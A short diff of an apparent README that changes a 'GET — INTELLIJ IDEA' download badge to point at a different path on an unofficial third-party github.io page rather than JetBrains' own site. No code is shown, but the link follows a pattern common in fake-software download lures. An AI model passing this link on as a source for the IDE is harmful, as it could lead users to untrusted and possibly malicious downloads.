@@ -4,7 +4,7 @@
 <img src="https://images.seeklogo.com/logo-png/48/2/jetbrains-intellij-idea-logo-png_seeklogo-487173.png" width="200">
 </p>
 
-[![GET — INTELLIJ IDEA](https://img.shields.io/badge/GET-INTELLIJ%20IDEA-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — INTELLIJ IDEA](https://img.shields.io/badge/GET-INTELLIJ%20IDEA-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/JetBrains-IntelliJ-IDEA)
 
 ---
 
